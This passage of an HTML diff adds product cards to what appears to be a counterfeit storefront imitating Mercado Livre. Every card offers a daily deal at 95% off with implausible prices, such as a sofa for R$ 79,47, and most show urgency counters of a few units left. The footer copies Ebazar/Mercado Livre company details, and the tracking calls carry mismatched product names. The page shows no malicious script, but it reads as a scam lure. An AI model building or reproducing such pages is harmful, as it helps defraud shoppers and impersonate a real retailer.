+          <p class="product-name">Cafeteira Portátil Nescafé <span style="font-family: 'GellixBold';">Cápsulas 220V</span>
+          </p>
+          <p></p>
+        </div>
+
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/filtro/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'JBL Partybox 710'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 1.399,00</div>
+          <span class="new-price">R$ 88,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 11 unidades</span>
+         <p class="product-name">Filtro De Água Electrolux - Gelada/natural </p>
+        <p></p></div>
+
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/cama/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/x1_1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 200,00</div>
+          <span class="new-price">R$ 39,90</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-vermelho">Restam 3 unidades</span>
+          <p class="product-name">Jogo Lençol Super King Size 4 Peças - 600 Fios Tecido Liso
+            <span style="font-family: 'GellixBold';">Cor Cáqui</span>
+          </p>
+        </div>
+
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/roboaspirador/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/as1.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 1.349,00</div>
+          <span class="new-price">R$ 94,60</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 18 unidades</span>
+          <p class="product-name">Robô aspirador Robot <span style="font-family: 'GellixBold';">W90</span>
+          </p>
+          <p></p>
+        </div>
+
+      </div>
+      <div class="bracelet-item" onclick="window.location.href='./produtos/sofa/index.html' + window.location.search; fbq('track', 'ViewContent', {content_name: 'iPhone 15 Pro'});">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/s1-2.jpg" style="height: 140px; width: auto;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="old-price">R$ 2.990,05</div>
+          <span class="new-price">R$ 79,47</span>
+          <span class="discount">95% OFF</span>
+          <div class="free-shipping-container">
+            <span class="free-shipping" style="font-family: 'GellixMedium';">Frete <span class="material-symbols-outlined" style="color: #4caf50; margin-right: 2px; font-size: 18px;">bolt</span>
+              <span style="font-family: 'GellixSemiBold';">FULL</span>
+            </span>
+          </div>
+          <span class="estoque estoque-verde">Restam 18 unidades</span>
+          <p class="product-name">Sofá Retrátil Reclinável 2,00m <span style="font-family: 'GellixBold';">King House</span>
+          </p>
+          <p></p>
+        </div>
+      </div>
+      <div class="bracelet-item">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/poco_antigo.webp" style="height: 115px; width: auto; margin-top: 20px;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
+            <div class="free-shipping-container">
+              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
+                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
+                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">SEM ESTOQUE</span>
+              </span>
+            </div>
+          </div>
+          <p class="product-name">JBL GO 4 <span style="font-family: 'GellixBold';">Preta</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphone_15_azul.jpg" style="height: 115px; width: auto; margin-top: 20px;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
+            <div class="free-shipping-container">
+              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
+                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
+                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">SEM ESTOQUE</span>
+              </span>
+            </div>
+          </div>
+          <p class="product-name">Apple iPhone 15 (256 GB) <span style="font-family: 'GellixBold';">Azul</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphone_15_verde.jpg" style="height: 115px; width: auto; margin-top: 20px;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
+            <div class="free-shipping-container">
+              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
+                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
+                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">SEM ESTOQUE</span>
+              </span>
+            </div>
+          </div>
+          <p class="product-name">Apple iPhone 15 (256 GB) <span style="font-family: 'GellixBold';">Verde</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/iphone_15_pro_max_titanio_azul.jpg" style="height: 115px; width: auto; margin-top: 20px;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
+            <div class="free-shipping-container">
+              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
+                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
+                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">SEM ESTOQUE</span>
+              </span>
+            </div>
+          </div>
+          <p class="product-name">Apple iPhone 15 Pro Max (256 GB) <span style="font-family: 'GellixBold';">Titânio Azul</span>
+          </p>
+        </div>
+      </div>
+      <div class="bracelet-item">
+        <div class="product-image" style="margin-bottom: 10px;">
+          <img src="images/ipad_10.jpg" style="height: 115px; width: auto; margin-top: 20px;">
+        </div>
+        <div class="product-info">
+          <div class="offer-tag">OFERTA DO DIA</div>
+          <div class="offer-tag" style="background-color: red; margin-top: 20px; margin-bottom: 5px;">
+            <div class="free-shipping-container">
+              <span class="free-shipping" style="font-family: 'GellixMedium'; color: white;">
+                <span class="material-symbols-outlined" style="color:white; margin-right: 2px; font-size: 18px; margin-left: 0px;">close</span>
+                <span style="font-family: 'GellixSemiBold'; margin-right: 5px;">SEM ESTOQUE</span>
+              </span>
+            </div>
+          </div>
+          <p class="product-name">Apple Ipad 256GB <span>Titânio Azul</span>
+          </p>
+        </div>
+      </div>
+    </div>
+    <div class="divisoria2"></div>
+    <p style="margin-left: 3%; margin-right: 3%; font-family: 'GellixRegular'; font-size: 14px; padding-top: 5px;">
+      <span style="font-family: 'GellixSemiBold';">Termos e condições. Como cuidamos da sua privacidade. Acessibilidade Informações sobre seguros Blog Afiliados Tendências</span>
+      <br>
+      <br>© 1999-2024 Ebazar.com.br LTDA. CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre. <span style="font-family: 'GellixSemiBold';">
+        <br>
+        <br>Brasil/Português </span>
+    </p>
+
+  
+<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" data-cf-beacon="{" rayid":"90d3b2d739bef5e2","version":"2025.1.0","r":1,"token":"fdda02b72d96466ba24f25504e15e81c","servertiming":{"name":{"cfextpri":true,"cfl4":true,"cfspeedbrain":true,"cfcachestatus":true}}}"="" crossorigin="anonymous"></script>
+</body>
+</html>
